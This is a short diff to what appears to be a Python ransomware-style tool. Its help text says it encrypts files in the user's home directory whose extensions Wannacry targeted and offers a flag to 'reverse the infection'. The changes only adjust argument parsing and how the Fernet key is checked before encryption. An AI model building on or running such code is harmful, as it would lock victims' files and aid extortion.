@@ -26,7 +26,7 @@ def parse_arguments():
         in the user's HOME directory and only encrypts files whose extensions have \
         been targeted by Wannacry."
     parser = argparse.ArgumentParser(description=desc)
-    parser.add_argument("-v", "--version", help="show the version of the program.")
+    parser.add_argument("-v", "--version", action="store_true", help="show the version of the program.")
     parser.add_argument("-r", "--reverse", nargs=1, metavar="<KEY>", help="reverse the infection with the <KEY> entered as argument")
     parser.add_argument("-s", "--silent", action="store_true", help="the program will not produce any output")
     return parser.parse_args()
@@ -76,4 +76,9 @@ if __name__ == "__main__":
     else:
         key: bytes = Fernet.generate_key()
         store_key(key)
-        encryption(key, path, silent)
+        try:
+            fernet = Fernet(key)
+        except ValueError as error:
+            print(error)
+            exit(1)
+        encryption(fernet, path, silent)
